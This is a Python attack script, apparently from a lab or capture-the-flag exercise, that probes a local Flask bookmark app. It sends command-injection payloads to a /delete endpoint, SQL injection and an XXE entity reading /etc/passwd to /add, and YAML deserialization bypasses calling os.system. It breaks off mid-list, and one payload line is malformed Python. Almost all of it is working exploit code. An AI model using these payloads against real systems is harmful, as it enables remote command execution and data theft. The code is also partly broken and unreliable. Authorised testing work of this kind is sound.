import requests
import base64
import urllib.parse

TARGET = "http://127.0.0.1:32979"
session = requests.Session()

print("INVESTIGATING /delete COMMAND INJECTION VECTOR")
print("=" * 60)

# The 500 errors on /delete are very interesting - let's probe deeper
# First, let's add a legitimate bookmark, then try to delete it with injection

# Add a test bookmark
response = session.post(f"{TARGET}/add", data={
    'name': 'testbookmark',
    'url': 'http://example.com'
}, timeout=10)
print(f"Added test bookmark: {response.status_code}")

# Now try delete with various payloads
# Based on Flask, this might be using os.system or subprocess with the name parameter

delete_tests = [
    ("normal_delete", "testbookmark"),
    ("semicolon", "testbookmark;id"),
    ("pipe", "testbookmark|id"),
    ("backtick", "testbookmark`id`"),
    ("dollar", "testbookmark$(id)"),
    ("single_quote", "testbookmark'"),
    ("double_quote", 'testbookmark"'),
    ("null_byte", "testbookmark\x00id"),
]

for name, payload in delete_tests:
    try:
        response = session.get(f"{TARGET}/delete", params={'name': payload}, timeout=10)
        print(f"\n[{name}] Payload: {repr(payload)}")
        print(f"Status: {response.status_code}")
        print(f"Response size: {len(response.text)}B")
        
        if response.status_code == 500:
            print("[!!!] Server error - potential injection point!")
        elif response.status_code == 302 or response.status_code == 200:
            if 'uid=' in response.text or 'root' in response.text:
                print("[!] COMMAND OUTPUT IN RESPONSE!")
                print(response.text[:1000])
    except Exception as e:
        print(f"[{name}] Exception: {str(e)}")

print("\n" + "=" * 60)
print("TESTING /add ENDPOINT FOR OTHER VULNERABILITIES")
print("=" * 60)

# Test /add with different payloads
add_tests = [
    ("name_sqli", {"name": "' OR '1'='1", "url": "http://test.com"}),
    ("url_sqli", {"name": "test", "url": "http://test.com' OR '1'='1"}),
    ("name_cmd", {"name": "test;id", "url": "http://test.com"}),
    ("url_cmd", {"name": "test", "url": "http://test.com;id"}),
    ("name_xxe", {"name": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>", "url": "http://test.com"}),
    ("large_input", {"name": "A"*5000, "url": "http://test.com"}),
]

for name, data in add_tests:
    try:
        response = session.post(f"{TARGET}/add", data=data, timeout=10)
        print(f"\n[{name}] Status: {response.status_code}")
        if response.status_code == 500:
            print("[!!!] Server error detected")
        elif 'error' in response.text.lower() and 'sql' in response.text.lower():
            print("[!] SQL error in response!")
            print(response.text[:500])
    except Exception as e:
        print(f"[{name}] Exception: {str(e)}")

print("\n" + "=" * 60)
print("TESTING MORE YAML BYPASS TECHNIQUES")
print("=" * 60)

# Try some more creative YAML bypasses
additional_payloads = [
    ("unicode_escape", "!!\\u0070ython/object/apply:os.system\nargs: [\"id\"]"),
    ("concat_string", '!!python/object/apply:"os"'."system"\nargs: ["id"]'),
    ("hex_encoded", "!!\\x70ython/object/apply:os.system\nargs: [\"id\"]"),
